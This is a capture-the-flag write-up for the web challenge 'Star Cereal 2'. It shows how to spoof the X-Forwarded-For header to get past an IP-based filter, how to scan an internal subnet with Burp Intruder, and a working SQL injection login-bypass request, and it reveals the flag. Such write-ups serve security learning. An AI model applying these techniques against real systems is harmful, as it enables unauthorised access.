<hr />

<h2>description: Spoofable client IP address, SQL injection vulnerability</h2>

<h1>Star Cereal 2</h1>

<h2>Description</h2>

<p>Ha, that was sneaky! But I've patched the login so that people like you can't gain access anymore. Stop hacking us!</p>

<p><code>http://20.198.209.142:55045</code></p>

<p><em>The flag is in the flag format: STC{...}</em></p>

<p><strong>Author: zeyu2001</strong></p>

<h2>Solution</h2>

<p>In <code>index.php</code>, notice the following comment</p>

<p>```markup
<!--
Star Cereal page by zeyu2001</p>

<p>TODO:
    1) URGENT - fix login vulnerability by disallowing external logins (done)
    2) Integrate admin console currently hosted at http://172.16.2.155
-->
```</p>

<p>Point 1) is referring to the previous challenge. Point 2) is interesting.</p>

<p>If we go to <code>login.php</code>, we get a 403 Forbidden Page:</p>

<p>```markup</p>

<h1>Forbidden</h1>

<p>Only admins allowed to login.</p>

<p>```</p>

<h3>Spoofable Client IP</h3>

<p>We could deduce that perhaps the server filters requests by the client IP. </p>

<p>A common security misconfiguration in implementing such a filter is the use of the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For">X-Forwarded-For header</a>. This header is used for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or a load balancer.</p>

<p>Note that HTTP request headers can be <a href="https://portswigger.net/kb/issues/00400110_spoofable-client-ip-address">easily spoofed</a>. Knowing that one of the internal IP addresses is 172.16.2.155, we may want to check the 172.16.2.0/24 subnet for valid client IPs.</p>

<p>If we do a scan (e.g. using Burp Suite Intruder) for the 172.16.2.0/24 subnet with the <code>X-Forwarded-For</code> header, we would find that if we set:</p>

<p><code>http
X-Forwarded-For: 172.16.2.24
</code></p>

<p>then we would see the login page.</p>

<h3>Burp Suite Intruder Scan</h3>

<p>First, set the payload position as follows:</p>

<p><img src="../../.gitbook/assets/Screenshot 2021-07-24 at 2.07.01 PM.png" alt="" /></p>

<p>Then, configure the payload as a list of numbers from 1 to 255.</p>

<p><img src="../../.gitbook/assets/Screenshot 2021-07-24 at 2.08.01 PM.png" alt="" /></p>

<p>Run the attack. Sort the output by either the Status or Length columns. We will find that <code>X-Forwarded-For: 172.16.2.24</code> gives us a 200 OK response code, and shows us the login page.</p>

<p><img src="../../.gitbook/assets/Screenshot 2021-07-24 at 2.09.23 PM.png" alt="" /></p>

<h3>SQL Injection</h3>

<p>Once we have access to the login page, notice the login form fields.</p>

<p>```markup</p>

<form action="/login.php" method="post">
    <div class="form-group">
        <label for="email">Email address</label>
        <input type="email" class="form-control" id="email" name="email" placeholder="Enter email">
    </div>
    <div class="form-group">
        <label for="pass">Password</label>
        <input type="pass" class="form-control" id="pass" name="pass" placeholder="Enter password">
    </div>
    <button type="submit" class="btn btn-primary">Submit</button>
</form>

<p>```</p>

<p>We need to submit an <code>email</code> and a <code>pass</code> parameter. We can exploit SQL injection to get the flag.</p>

<p>```http
POST /login.php HTTP/1.1
Host: localhost:55043
X-Forwarded-For: 172.16.2.24</p>

<p>...</p>

<p>Content-Type: application/x-www-form-urlencoded
Content-Length: 51</p>

<p>email=test&amp;pass=test' UNION SELECT 'test', 'test';#
```</p>

<p>The flag is <code>STC{w0w_you'r3_r3lly_a_l33t_h4x0r_bc1d4611be52117c9a8bb99bf572d6a7}</code>.</p>

<p><img src="../../.gitbook/assets/Screenshot 2021-07-24 at 2.18.39 PM.png" alt="" /></p>
